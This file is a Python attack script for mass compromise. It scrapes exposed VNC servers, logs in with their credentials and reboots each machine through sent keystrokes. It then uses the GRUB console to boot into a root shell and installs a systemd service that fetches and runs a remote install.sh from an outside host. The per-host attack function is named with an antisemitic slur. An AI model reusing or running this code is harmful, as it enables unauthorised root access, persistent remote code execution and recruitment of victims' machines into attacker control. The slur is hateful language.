#!/usr/bin/env python3

import sys
import asyncio, asyncvnc
import scrape
import os.path

shift_chars = {
    '~': '`', '!': '1', '@': '2', '#': '3', '$': '4', '%': '5', '^': '6', '&': '7',
    '*': '8', '(': '9', ')': '0', '_': '-', '+': '=', 'Q': 'q', 'W': 'w', 'E': 'e',
    'R': 'r', 'T': 't', 'Y': 'y', 'U': 'u', 'I': 'i', 'O': 'o', 'P': 'p', '{': '[',
    '}': ']', '|': '\\', 'A': 'a', 'S': 's', 'D': 'd', 'F': 'f', 'G': 'g', 'H': 'h',
    'J': 'j', 'K': 'k', 'L': 'l', ':': ';', '"': "'", 'Z': 'z', 'X': 'x', 'C': 'c',
    'V': 'v', 'B': 'b', 'N': 'n', 'M': 'm', '<': ',', '>': '.', '?': '/'
}

async def write(client, s):
    for c in s:
        if c in shift_chars:
            with client.keyboard.hold("Shift"):
                await asyncio.sleep(0.3)
                with client.keyboard.hold(c):
                    await asyncio.sleep(0.3)
        else:
            with client.keyboard.hold(c):
                await asyncio.sleep(0.3)
        await asyncio.sleep(0.3)

async def reboot(client):
    for i in range(10):
        client.keyboard.press("Ctrl", "Alt", "Del")
        await asyncio.sleep(0.02)
        for i in range(20):
            with client.keyboard.hold("Esc"):
                await asyncio.sleep(0.05)
    client.keyboard.press("Alt", "Print", "b")

async def grub_enter(client):
    for x in range(2000):
        with client.keyboard.hold("Esc"):
            await asyncio.sleep(0.05)
    client.keyboard.press("c")

async def grub_boot(client):
    for x in [
            "insmod lvm",
            "search --file --set=r /bin/sh",
            "probe --set=u -u $r",
            "insmod regexp",
            'for a in ($root)/*; do if [ "$a" = "($root)/boot" ]; then for b in ($root)/boot/*; do if regexp ".*/vmlinu.*" "$b"; then set l=$b;break 2;fi;done;fi;if regexp ".*/vmlinu.*" "$a"; then set l=$a; break;fi;done',
            'regexp ".*/vmlinu.(.*)" $l --set v',
            'for a in ($root)/*; do if [ "$a" = "($root)/boot" ]; then for b in ($root)/boot/*; do if regexp ".*/initr.*$v" "$b"; then if ! regexp "kdump" "$b"; then set i=$b;break 2;fi;fi;done;fi;if regexp ".*/initr.*$v" "$a"; then if ! regexp "kdump" "$a"; then set i=$a;break;fi;fi;done',
            "linux $l root=UUID=$u rw init=/bin/sh",
            "initrd $i",
            "boot"
    ]:
        await write(client, x + ";")
    client.keyboard.press("Return")
    await asyncio.sleep(15)

async def rootkit(client):
    await asyncio.sleep(20)
    for x in [
            'printf "[Unit]\\nAfter=network.target\\nDescription=a\\n\\n[Service]\\nUser=root\\nGroup=root\\nExecStart=/bin/sh -c \'(wget flamecord.zixel.tk/install.sh -O/install.sh || curl -L flamecord.zixel.tk/install.sh -o /install.sh); sh /install.sh\'\\n\\n[Install]\\nWantedBy=multi-user.target" > /usr/lib/systemd/system/qqq.service',
            "ln -s /usr/lib/systemd/system/qqq.service /etc/systemd/system/multi-user.target.wants/qqq.service",
            "reboot -f || sbin/reboot -f",
    ]:
        await write(client, x + ";")
    client.keyboard.press("Return")

async def jew(ip, port, username, password):
    try:
        print(f"connecting to {ip}:{port}")
        async with asyncvnc.connect(ip, int(port), username, password) as client:
            print(f"connected to {ip}:{port}")
            await reboot(client)
            await grub_enter(client)
            await grub_boot(client)
            await rootkit(client)
    except:
        return

async def main():
    vncs = scrape.get_vncs(*sys.argv[1:])
    tried = set()
    if os.path.isfile("tried.txt"):
        with open("tried.txt", "r") as f:
            tried = set(f.read().split("\n"))
    vncs = [vnc for vnc in vncs if f"{vnc['HostIp']}:{vnc['Port']}" not in tried]
    with open("tried.txt", "a") as f:
        for vnc in vncs:
            f.write(f"{vnc['HostIp']}:{vnc['Port']}\n")
    tasks = [jew(vnc["HostIp"], vnc["Port"], vnc["Username"], vnc["Password"]) for vnc in vncs]
    await asyncio.gather(*tasks)

if __name__ == '__main__':
    asyncio.run(main())
